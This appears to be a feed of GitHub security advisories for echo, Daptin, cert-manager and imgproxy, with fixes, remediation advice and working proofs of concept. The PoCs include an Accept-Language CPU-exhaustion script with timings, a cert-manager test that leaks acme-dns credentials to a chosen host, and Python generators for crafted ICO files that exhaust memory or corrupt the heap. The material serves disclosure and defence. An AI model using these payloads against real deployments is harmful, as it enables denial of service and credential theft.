**Honest caveat on validity / severity:** this only has security impact for applications that (a) serve a directory statically to the public *and* (b) place a sensitive file inside that same directory while relying on a *route-level* guard to protect it. That combination is arguably a misconfiguration — a statically-served directory is public by design — so maintainers may reasonably classify this as a documentation fix (correct the `EnablePathUnescaping` claim) or won't-fix rather than a code vulnerability. It is filed primarily because (1) the router-vs-handler `%2F` inconsistency is the exact class fixed in CVE-2026-55677 but left uncovered for `middleware.Static`, and (2) the docstring currently promises protection it does not provide.

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. With the default settings, the Static middleware resolves files from the same form of the path that the router matched, so percent-encoded paths such as `/admin%2Fsecret.txt` or `/%61dmin/secret.txt` no longer reach a file under a guarded route. Paths with `.`, `..` or empty segments are no longer served.

Note: middleware registered with `Echo#Use` runs before route and group middleware, so route guards never protect files served by a global Static middleware. Keep protected files outside its root directory, or serve them with `Echo#Static` behind the guard.

## Workarounds

Keep files that need protection outside the Static middleware's root directory.

References:
- https://github.com/labstack/echo/security/advisories/GHSA-375p-5qhx-8wq4 [WEB]
- https://github.com/labstack/echo/commit/b838391e2eade87ae7e5a09d7bb5087bec271ec1 [WEB]
- https://github.com/labstack/echo/commit/fc410094b2f3415cf2bf5204082137b205bfd5af [WEB]
- https://github.com/labstack/echo [PACKAGE]
- https://github.com/labstack/echo/releases/tag/v4.16.0 [WEB]
- https://github.com/labstack/echo/releases/tag/v5.4.0 [WEB]

### GHSA-rhj7-vh3v-mcq6 — Daptin: ParseAcceptLanguage `_` separator bypass enables >250x CPU amplification via Accept-Language header in LanguageMiddleware
- Aliases: CVE-2026-62160 | Published: 2026-10-29 | Modified: 2026-10-29 | Severity: HIGH
- CWE: CWE-400
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected Go/github.com/daptin/daptin: introduced:0 last_affected:0.12.15

### Summary

Daptin's `LanguageMiddleware` (registered as a global gin middleware) calls `golang.org/x/text/language.ParseAcceptLanguage` on the raw `Accept-Language` header of every HTTP request without imposing any size or shape filter. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of `-` characters in the input at 1000, but it does not cap `_` characters even though the parser's internal scanner aliases `_` to `-` before parsing. A single unauthenticated GET request with an `Accept-Language` header built out of `_` separators (only 256 KiB, not even the 1 MiB ceiling) consumes about 27 seconds of server CPU on the host running Daptin. A 1 MiB payload exceeds the 2-minute test client timeout. A single attacker on a 1 Mbit/s uplink can pin an entire Daptin host with one request every 30 seconds.

### Affected versions

`github.com/daptin/daptin` v0.12.15 and (per code inspection of `master`) all earlier 0.12.x versions that wire `LanguageMiddleware` on the global gin router without imposing their own size limit on `Accept-Language`. Verified on:

- the official release binary `daptin-linux-amd64` v0.12.15 built into a Docker image from the project's own `Dockerfile` (E2E below)
- `master` at commit `b021ac4ae1f72b7401e851fcf883bc970303c794` by reading `server/language.go` (the middleware is unchanged)

### Privilege required

Unauthenticated. The middleware is registered on the global gin router that serves both the public landing page and the unauthenticated `/api` style endpoints. Anyone who can reach the HTTP listener (port 8080 by default) is in scope.

### Vulnerable code

[`server/language.go`](https://github.com/daptin/daptin/blob/b021ac4ae1f72b7401e851fcf883bc970303c794/server/language.go) (blob SHA `b021ac4ae1f72b7401e851fcf883bc970303c794`):

```go
func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    pref := GetLanguagePreference(c.GetHeader("Accept-Language"), lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}

func GetLanguagePreference(header string, defaultLanguage string) []string {
    preferredLanguage := header

    if preferredLanguage == "" || preferredLanguage == "undefined" || preferredLanguage == "null" {
        preferredLanguage = defaultLanguage
    }

    languageTags, _, err := language.ParseAcceptLanguage(preferredLanguage)
    resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)
    pref := make([]string, 0)
    prefMap := make(map[string]bool)

    if len(languageTags) == 1 && languageTags[0].String() == defaultLanguage {
        // single tag matches default — skip
    } else {
        for _, tag := range languageTags {
            base, conf := tag.Base()
            if conf == 0 {
                continue
            }
            if prefMap[base.String()] == true {
                continue
            }
            prefMap[base.String()] = true
            pref = append(pref, base.String())
        }
    }
    return pref
}
```

`c.GetHeader("Accept-Language")` is the unfiltered HTTP header. Go's default `net/http` `MaxHeaderBytes` is `1 << 20` = 1 MiB and Daptin does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.

The `resource.CheckErr` call on the error path also formats the entire input string into a log line (`Failed to parse Accept-Language header [%v]`), amplifying the cost on attacker-supplied 256 KiB-1 MiB payloads.

CVE-2022-32149 hardened `ParseAcceptLanguage` by counting `-` characters and rejecting inputs with more than 1000 of them. The guard does not count `_` characters even though the scanner converts `_` to `-` at parse time ([`golang.org/x/text/internal/language/parse.go`](https://github.com/golang/text/blob/v0.28.0/internal/language/parse.go)). A 256 KiB header full of 9-character `_abcdefghi` tokens contains zero `-` characters, passes the guard, and then drives the scanner into the O(N²) `gobble` path.

### How `Accept-Language` reaches `ParseAcceptLanguage`

Every HTTP request that hits the Daptin API server passes through `LanguageMiddleware` (registered as a global gin middleware). The middleware sequence is:

1. The request enters `LanguageMiddlewareFunc`.
2. `c.GetHeader("Accept-Language")` returns the full attacker-supplied header value.
3. `GetLanguagePreference(header, defaultLanguage)` is called.
4. The function passes the unfiltered header into `language.ParseAcceptLanguage(preferredLanguage)`.

No size or character-class filter is applied between (2) and (4). The middleware runs for every gin handler — including the unauthenticated landing page at `/` and the public API root at `/api`.

### Proof of concept

Single-line bash reproducer that crafts the malicious header and times one request against a fresh Daptin container built from the project's own Dockerfile:

```bash
# Build daptin image (uses prebuilt linux/amd64 release binary)
cd daptin
curl -fL -O https://github.com/daptin/daptin/releases/download/v0.12.15/daptin-linux-amd64
chmod +x daptin-linux-amd64
docker build --platform linux/amd64 -t daptin-poc:v0.12.15 .

# Start it
docker run -d --platform linux/amd64 --name daptin --rm -p 18888:8080 daptin-poc:v0.12.15
sleep 8  # wait for sqlite migrations + Olric ring

# Attack with a 256 KiB header (smaller than the default 1 MiB ceiling
# because daptin's per-request cost saturates well below 1 MiB)
PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 25600, end="")')"
echo "header size = ${#PAYLOAD} bytes"

curl -sS -o /dev/null \
  -w 'http=%{http_code} t=%{time_total}\n' \
  -H "Accept-Language: ${PAYLOAD}" \
  http://127.0.0.1:18888/
```

Each 9-character `_abcdefghi` token has length 9, which fails the scanner's `len <= 8` tag-length check at `golang.org/x/text/internal/language/parse.go` and triggers a `gobble` call that `runtime.memmove`s the entire remaining buffer. With N invalid tokens the total bytes moved by `gobble` is O(N²).

### End-to-end reproduction (against `daptin-linux-amd64` v0.12.15)

A Go driver `poc.go` boots the container, sends a 256 KiB `Accept-Language` value once with `-` (CVE-2022-32149 guard fires) and once with `_` (guard bypassed):

```go
// poc.go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"
)

const targetURL = "http://127.0.0.1:18888/"

func buildPayload(sep string, targetBytes int) string {
    const tok = "abcdefghi"
    var b strings.Builder
    b.Grow(targetBytes + 16)
    b.WriteString("en")
    for b.Len()+1+len(tok) <= targetBytes {
        b.WriteString(sep)
        b.WriteString(tok)
    }
    return b.String()
}

func send(label, header string) {
    client := &http.Client{
        Timeout: 120 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
        },
    }
    req, _ := http.NewRequest("GET", targetURL, nil)
    if header != "" {
        req.Header.Set("Accept-Language", header)
    }
    t0 := time.Now()
    resp, err := client.Do(req)
    dt := time.Since(t0)
    if err != nil {
        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
        return
    }
    _, _ = io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
        label, len(header),
        strings.Count(header, "_"), strings.Count(header, "-"),
        resp.StatusCode, dt)
}

func main() {
    send("warm-up", "")
    send("baseline (no header)", "")
    send("baseline (1 short tag)", "en-US")
    send("guard-fires ('-' x 256KiB)", buildPayload("-", 256*1024))
    send("attack ('_' x 256KiB)",     buildPayload("_", 256*1024))
    send("attack repeat 2",            buildPayload("_", 256*1024))
    send("attack repeat 3",            buildPayload("_", 256*1024))
}
```

Captured run output (Apple M1 Pro, darwin/arm64 host, daptin amd64 binary v0.12.15 running under Docker Desktop with QEMU x86_64 emulation):

```
E2E: golang/x/text ParseAcceptLanguage '_' bypass through
daptin/daptin v0.12.15 LanguageMiddleware at
server/language.go.

Target: http://127.0.0.1:18888/   payload=262144 B

  warm-up                                      header=0 B  '_'=0  '-'=0  status=200  t=19.968ms

--- measurements (single request each) ---
  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=200  t=25.924208ms
  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=200  t=28.398333ms
  guard-fires control ('-' x 256KiB)           header=262142 B  '_'=0  '-'=26214  status=200  t=105.506458ms
  attack ('_' x 256KiB)                        header=262142 B  '_'=26214  '-'=0  status=200  t=26.679448875s
  attack repeat 2                              header=262142 B  '_'=26214  '-'=0  status=200  t=18.012964208s
  attack repeat 3                              header=262142 B  '_'=26214  '-'=0  status=200  t=8.868606042s
```

A separate run with a 1 MiB payload exceeded the 2-minute client timeout on the attack request, confirming that the cost scales beyond 120 s per request at 1 MiB.

Interpretation:

| Request                                  | Header bytes | Server time |
|------------------------------------------|--------------|-------------|
| no header / short tag                    | 0 - 5        | 26 - 28 ms  |
| 256 KiB `-` separators (CVE-2022-32149 guard fires) | 256 KiB | 106 ms      |
| 256 KiB `_` separators (guard bypassed)  | 256 KiB      | 9 - 27 s    |
| 1 MiB `_` separators (guard bypassed)    | 1 MiB        | > 120 s     |

The `-` control proves that the existing CVE-2022-32149 guard does still work on the canonical separator: a 256 KiB `-` payload returns in 106 ms because the parser short-circuits with `ErrTagListTooLarge`. The `_` attack returns 200 from the same endpoint but consumes 9-27 s of server CPU because the guard did not fire and the quadratic scanner ran to completion. The amplification factor at the application boundary is ~85-250x on the 256 KiB payload and >1000x on a 1 MiB payload.

The amplification is higher than other consumers of `ParseAcceptLanguage` because Daptin formats the entire input into a log line via `resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)` when parsing fails, and runs additional bookkeeping in `GetLanguagePreference` (a `prefMap` deduplication loop over the resulting tag slice).

### Impact

- One unauthenticated client can pin one CPU core for ~9-27 seconds per 256 KiB request, or for at least 120 seconds per 1 MiB request.
- A single attacker on a 1 Mbit/s uplink can sustain ~1 attack request every 30 seconds, pinning one server core continuously with one TCP connection.
- A small number of concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core Daptin instance indefinitely.
- The endpoint returns 200 OK, so the attack does not surface as abnormal traffic in standard 4xx/5xx dashboards.

### Suggested fix

Apply the size / character-class filter inside `LanguageMiddleware` (and inside `GetLanguagePreference` for defence in depth) before reaching `language.ParseAcceptLanguage`. The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count `_` alongside `-` and short-circuit when the total exceeds a small ceiling:

```go
// server/language.go
const maxAcceptLanguageSeparators = 32 // real browsers send < 10

func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    header := c.GetHeader("Accept-Language")
    if strings.Count(header, "-")+strings.Count(header, "_") > maxAcceptLanguageSeparators {
        // Refuse to call into the BCP 47 parser with absurd input.
        header = ""
    }
    pref := GetLanguagePreference(header, lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}
```

A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.

The underlying issue is in `golang.org/x/text/language`. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.

### Credit

Reported by tonghuaroot.

### Fix PR

https://github.com/daptin/daptin-ghsa-rhj7-vh3v-mcq6/pull/1

### Maintainer fix status

Fixed on `master` in commit `2d709509 Harden Accept-Language parsing`.

The fix caps combined `-` and `_` separators in `Accept-Language` before calling `language.ParseAcceptLanguage`, both in `LanguageMiddlewareFunc` and in `GetLanguagePreference` for defence in depth. Regression coverage was added in `server/language_test.go` for normal browser headers, a 256 KiB underscore-separated malformed header, and combined separator counting.

Verification run:

```bash
go test ./server -count=1
```

Result: passed.

References:
- https://github.com/daptin/daptin/security/advisories/GHSA-rhj7-vh3v-mcq6 [WEB]
- https://github.com/daptin/daptin [PACKAGE]

### GHSA-8rvj-mm4h-c258 — cert-manager: Direct ACME Challenge resources can bypass Issuer DNS01 solver policy and use ClusterIssuer DNS credentials
- Aliases: CVE-2026-62290 | Published: 2026-10-29 | Modified: 2026-10-29 | Severity: HIGH
- CWE: CWE-863
- CVSS_V3: `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
- Affected Go/github.com/cert-manager/cert-manager: introduced:1.18.0 fixed:1.19.6
- Affected Go/github.com/cert-manager/cert-manager: introduced:1.20.0-alpha.0 fixed:1.20.3

## Summary

`Challenge` resources under `acme.cert-manager.io` can be created directly by namespace users. On create, cert-manager performs no admission validation tying the Challenge to an `Order`, an owner reference, or an Issuer-selected solver. The ACME Challenge controller then reconciles the direct resource and uses `Challenge.spec.solver` as the DNS01 provider configuration.

When the direct Challenge references a `ClusterIssuer`, cert-manager derives the DNS provider secret namespace and ambient-credential policy from the `ClusterIssuer` reference, but the DNS provider configuration itself is attacker-controlled through `Challenge.spec.solver`. This lets a namespace user bypass `Issuer`/`ClusterIssuer` solver selectors such as `dnsZones`, `dnsNames`, and `matchLabels`, and make the cert-manager controller use ClusterIssuer DNS credentials for attacker-selected provider settings and DNS names.

In the acme-dns case, this becomes credential disclosure because the attacker-controlled solver host receives the `X-Api-User` and `X-Api-Key` headers loaded by cert-manager from the ClusterIssuer resource namespace.

## Attack preconditions

- The attacker can create `challenges.acme.cert-manager.io` resources in at least one namespace.
- The cert-manager controller is running and reconciles ACME `Challenge` resources cluster-wide.
- A usable `ClusterIssuer` exists in the cluster.
- The referenced `ClusterIssuer` has a DNS01 solver that uses a Secret in the cluster resource namespace, or relies on ambient credentials enabled for `ClusterIssuer`.
- The cluster is multi-tenant or otherwise separates namespace users from platform-owned Issuer/ClusterIssuer and DNS credential administration.

## Severity

Rationale: a tenant with namespace-level ACME Challenge create permissions, including permissions granted by cert-manager's aggregate edit role, can cause a cluster-scoped controller to use DNS credentials or ambient cloud credentials outside the Issuer's intended solver policy. With acme-dns specifically, this can disclose the referenced acme-dns account credential to an attacker-controlled endpoint. With other DNS providers, the impact is credential use, Issuer policy bypass, and unauthorized DNS mutation risk unless a provider-specific credential disclosure path is separately demonstrated.

## Why this is not just RBAC misconfiguration

cert-manager's documented end-user workflow does not require users to manually create `Challenge` resources. Challenges are internal ACME workflow objects generated from Orders after cert-manager has selected a solver from the referenced Issuer or ClusterIssuer. If default or aggregate roles grant namespace users permission to create these resources, the controller still should not treat a user-controlled `Challenge.spec.solver` as authoritative for a referenced `ClusterIssuer`.

The security boundary is the Issuer/ClusterIssuer solver policy and credential configuration. Direct Challenge creation bypasses that boundary because the controller derives credential namespace and ambient credential permission from `issuerRef`, while accepting the DNS provider configuration from the untrusted Challenge object.

## Affected components

- ACME Challenge admission validation
- ACME Challenge controller
- DNS01 solver selection and DNS provider construction
- Default aggregate RBAC for `challenges.acme.cert-manager.io`

## Affected versions tested

The issue was reproduced on:

- `master` commit `2c0f1a6a4`
- latest production release `v1.20.2` commit `e5b7b1845`
- `v1.19.5` commit `cda7b7896`
- `v1.18.6` commit `4699caabb`

See `VERSION_TEST_MATRIX.md` for the command matrix and outputs.

## Technical details

Relevant code paths:

- `internal/apis/acme/validation/challenge.go:44-45`: `ValidateChallenge` returns no errors on create.
- `deploy/crds/acme.cert-manager.io_challenges.yaml`: `spec.solver` is a required user-controlled field on `Challenge`.
- `pkg/controller/acmechallenges/scheduler/scheduler.go:51-58`: scheduler lists all Challenges.
- `pkg/controller/acmechallenges/controller.go:180-197`: scheduler sets `status.processing=true`.
- `pkg/controller/acmechallenges/sync.go:139-183`: controller loads the referenced Issuer and then presents the Challenge.
- `pkg/issuer/acme/dns/dns.go:81`: DNS solver `Present` ignores the issuer object argument.
- `pkg/issuer/acme/dns/dns.go:180-187`: DNS provider config and resource namespace are derived from `Challenge.spec`.
- `pkg/controller/helper.go:39-44`: `ClusterIssuer` references use the cluster resource namespace.
- `pkg/controller/helper.go:66-72`: ambient credentials are allowed based on `issuerRef.kind`.
- `internal/apis/config/controller/v1alpha1/defaults.go:68-69`: ClusterIssuer ambient credentials default to enabled.
- `deploy/charts/cert-manager/templates/rbac.yaml:517-519`: the aggregate edit role can create/update `challenges` and `orders`.

The normal `Order` flow selects a solver from the Issuer:

- `pkg/util/solverpicker/solverpicker.go`: solver selectors are evaluated.
- `pkg/controller/acmeorders/util.go:94-106`: solvers are fetched from the Issuer and selected.
- `pkg/controller/acmeorders/util.go:131-142`: the selected solver is copied into the generated Challenge.

The direct `Challenge` flow skips that selection entirely because the direct object already contains a solver.

## Proof of concept

### PoC A: low-privileged namespace user can persist a direct ClusterIssuer Challenge

The following script starts k3s in Docker, installs only the relevant CRDs, creates a platform-owned ClusterIssuer, creates a namespace user with Challenge create permission but no secret or ClusterIssuer read permission, and creates a direct DNS01 Challenge referencing that ClusterIssuer and a cluster resource namespace secret.

The ClusterIssuer is configured to use a legitimate acme-dns host for `victim.example.com`. The direct Challenge uses that same DNS name, but replaces the acme-dns host with an attacker-controlled endpoint. This demonstrates credential disclosure without relying on an out-of-policy DNS name.

A broader DNS policy-bypass variant is also possible when the referenced credential or ambient provider can operate on the attacker-selected DNS name. In that case, the same direct Challenge path bypasses the Issuer/ClusterIssuer solver selectors and provider configuration.

Run from the cert-manager repository root:

```bash
set -euo pipefail

name=cm-direct-challenge-poc
docker rm -f "$name" >/dev/null 2>&1 || true
docker run -d --name "$name" --privileged -v "$PWD":/repo rancher/k3s:v1.33.4-k3s1 \
  server --disable=traefik --disable=servicelb --write-kubeconfig-mode=644 >/dev/null

cleanup() {
  docker rm -f "$name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

for i in $(seq 1 90); do
  docker exec "$name" kubectl get --raw=/readyz >/dev/null 2>&1 && break
  sleep 2
done

docker exec "$name" kubectl apply -f /repo/deploy/crds/cert-manager.io_clusterissuers.yaml >/dev/null
```

### PoC B: acme-dns provider sends referenced credentials to the configured host

This self-contained unit PoC demonstrates the concrete acme-dns impact: the acme-dns provider uses the configured host and sends credentials from account JSON as HTTP headers.

Run from repository root:

```bash
set -euo pipefail

cat > pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go <<'EOF'
package acmedns

import (
        "context"
        "net/http"
        "net/http/httptest"
        "testing"
)

func TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost(t *testing.T) {
        var gotUser, gotKey, gotPath string

        ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                gotPath = r.URL.Path
                gotUser = r.Header.Get("X-Api-User")
                gotKey = r.Header.Get("X-Api-Key")
                w.Header().Set("Content-Type", "application/json")
                w.WriteHeader(http.StatusOK)
                w.Write([]byte(`{"txt":"ok"}`))
        }))
        defer ts.Close()

        accountJSON := []byte(`{
                "victim.example.com": {
                        "username": "victim-user",
                        "password": "victim-pass",
                        "fulldomain": "x.example.org",
                        "subdomain": "x"
                }
        }`)

        provider, err := NewDNSProviderHostBytes(ts.URL, accountJSON, nil)
        if err != nil {
                t.Fatal(err)
        }

        if err := provider.Present(context.Background(), "victim.example.com", "", "txt-value"); err != nil {
                t.Fatal(err)
        }

        if gotPath != "/update" {
                t.Fatalf("path = %q, want /update", gotPath)
        }
        if gotUser != "victim-user" {
                t.Fatalf("X-Api-User = %q, want victim-user", gotUser)
        }
        if gotKey != "victim-pass" {
                t.Fatalf("X-Api-Key = %q, want victim-pass", gotKey)
        }
}
EOF

docker run --rm \
  -v "$PWD":/repo \
  -v /tmp/cert-manager-gomod-cache:/go/pkg/mod \
  -v /tmp/cert-manager-gobuild-cache:/root/.cache/go-build \
  -w /repo golang:1.26-bookworm \
  go test ./pkg/issuer/acme/dns/acmedns \
  -run TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost \
  -count=1 -v

rm pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go
```

Expected output:

```text
=== RUN   TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost
--- PASS: TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost
```

Combined with PoC A and the code path in `pkg/issuer/acme/dns/dns.go`, this shows that a direct Challenge can select an attacker-controlled acme-dns host while causing cert-manager to load account JSON from the ClusterIssuer resource namespace.

## Credential impact scope

The concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled `host` receives the `X-Api-User` and `X-Api-Key` values loaded from the referenced account JSON.

For other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.

## Expected behavior

Users should not be able to create standalone `Challenge` resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct `Challenge` resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.

## Actual behavior

A user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from `issuerRef`, and uses attacker-controlled provider settings.

## Suggested remediation

Possible mitigations:

- Reject or ignore standalone user-created `Challenge` resources unless the controller or admission layer can confirm an existing cert-manager-created `Order` that owns the Challenge.
- Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.
- Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.
- Move `Challenge` and `Order` creation permissions out of aggregate `edit` unless direct use is a supported security boundary.
- Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.

### GHSA-mmq5-xm89-9pfg — imgproxy has unbounded memory allocation in ICO loader that allows unauthenticated memory-exhaustion DoS via crafted data_size field
- Aliases:  | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-400
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Go/github.com/imgproxy/imgproxy/v3: introduced:3.3.0 fixed:4.0.16

### Summary

Unbounded and unvalidated memory allocation in imgproxy's ICO loader (`vips/icoload.c`). An attacker-controlled `data_size` field (u32) from the ICO directory entry is passed directly to `VIPS_MALLOC` without any bounds check, so a single crafted 23-byte ICO file makes an imgproxy worker attempt a ~4GB allocation. Present in the latest release (v4.0.15) and the 3.3.x series; confirmed on a live production deployment of imgproxy v4.0.15.

### Details

In `vips_foreign_load_ico_header` in `vips/icoload.c`, the selected directory entry's `data_size` is read and used directly for the allocation:

```
uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

// BMP file explicitly excludes BITMAPFILEHEADER, so we need to add it manually.
VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);
```

There is no validation that `data_size` is sane nor any check that the file actually contains `data_size` bytes at the declared `data_offset`. A crafted 23-byte ICO whose directory entry declares `data_size = 0xfa000068` (~4GB) drives `VIPS_MALLOC(NULL, ~4GB + 14)`.

### PoC

```py
# make_ico_4gb.py — generates the exact 23-byte unbounded-allocation trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-4gb.ico  sha256 6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 0xfa000068, 0x16)
data = b'\x00'
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b'
open('ico-4gb.ico', 'wb').write(blob)
print(f"ico-4gb.ico: {len(blob)} bytes [VERIFIED]")
```

```
# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-4gb.ico@png"
# → outcome depends on host memory: on a memory-constrained pod the worker
#   OOM-dies; on a larger host the ~4GB allocation succeeds transiently and
#   decode fails -> HTTP 500 (worker survives, but each request burns ~4GB
#   transiently — repeatable memory exhaustion).
```

### Impact

Unauthenticated network DoS / memory-exhaustion: on memory-constrained workers, a crash per crafted request. On larger hosts, ~4GB transient allocation per request (sustained firing exhausts memory or the allocation budget). Any imgproxy deployment that processes attacker-supplied images.

- https://github.com/imgproxy/imgproxy/commit/a821b6a4cb07a1bf2bb9077431d1c1e734d79917 [WEB]
- https://github.com/imgproxy/imgproxy [PACKAGE]
- https://github.com/imgproxy/imgproxy/releases/tag/v4.0.16 [WEB]

### GHSA-494m-4556-wf5p — imgproxy has out-of-bounds heap read/write in ICO loader BMP header reconstruction that allows unauthenticated remote worker crash
- Aliases:  | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-125, CWE-787
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected Go/github.com/imgproxy/imgproxy/v3: introduced:3.3.0 fixed:4.0.17

### Summary

Out-of-bounds heap write in imgproxy's ICO loader (`vips/icoload.c`): when the ICO entry's image data buffer is small, the loader's BMP-header-reconstruction writes land past the allocation, corrupting the size field of the following heap chunk. The worker then aborts deterministically (glibc `munmap_chunk(): invalid pointer` → SIGABRT → Go panic, exit code 2). 

### Details

In `vips_foreign_load_ico_header` in `vips/icoload.c`, after the ICO entry's image data is read into a heap buffer of `data_size + 14` bytes, the loader reconstructs a BMP file header in front of it using fields read from the ICO's internal BITMAPINFOHEADER:

```
uint32_t num_colors = GUINT32_FROM_LE(*(uint32_t *) (actual_data + 32));  // unvalidated
uint16_t bpp        = GUINT16_FROM_LE(*(uint16_t *) (actual_data + 14));  // unvalidated
```

```
if ((num_colors == 0) && (bpp <= 8))
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * (1 << bpp);
else
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * num_colors;
```

```
int32_t height = GINT32_FROM_LE(*(int32_t *) (actual_data + 8));  // readable past the buffer
height = height / 2;
```

With a crafted entry declaring a tiny `data_size` (e.g. 1 byte), all of these reads (offsets +8, +14, +32) go past the allocation, and the reconstructed-header writes land past the end of the buffer — specifically a 32-bit `height/2`-derived value at `alloc+22..+25`, overwriting the LSBs of the size field of the physically following heap chunk. The corrupted size is always `original_size >> 1` and, in cgo thread arenas, the `NON_MAIN_ARENA` bit lands in the `IS_MMAPPED` position of the corrupted word such that the next `free()` of the victim deterministically takes glibc's `munmap_chunk()` abort path, killing the worker. Depending on heap state, the worker returns 500 for the triggering request and aborts on the corrupted chunk's free; in observed production geometry it dies on the same request (exit code 2).


### PoC

```py
# make_ico_oob.py — generates the exact 23-byte OOB-write trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-oob.ico  sha256 075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
# 16x16, 0 colors, 0 reserved, 1 plane, 32 bpp, data_size=1, data_offset=0x16.
# The tiny data_size (1) makes the loader's BMPINFOHEADER field reads
# (data+8/+14/+32) and header-reconstruction writes go past the 1+14=15-byte
# allocation.
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 1, 0x16)
data = b'\xAA'  # the single declared image byte
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1'
open('ico-oob.ico', 'wb').write(blob)
print(f"ico-oob.ico: {len(blob)} bytes [VERIFIED]")
```

```
# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-oob.ico@png"
# → request fails at transport level (connection reset / empty reply) or
#   HTTP 500; worker dies: munmap_chunk(): invalid pointer → SIGABRT →
#   Go panic dump → exit code 2. One request, one dead worker.

curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/normal.ico@png"
# → HTTP 200, valid thumbnail (control)
```

### Impact

Out-of-bounds write; demonstrated impact is denial of service (worker crash per crafted request). Any imgproxy deployment from the 3.3.x ICO-support series through v4.0.15 (latest at time of report) that processes attacker-supplied images.

References:

- https://github.com/imgproxy/imgproxy/pull/1726 [WEB]
- https://github.com/imgproxy/imgproxy/commit/39fd9e844a8a46084161502e993d5a3c16ccf28d [WEB]
- https://github.com/imgproxy/imgproxy [PACKAGE]

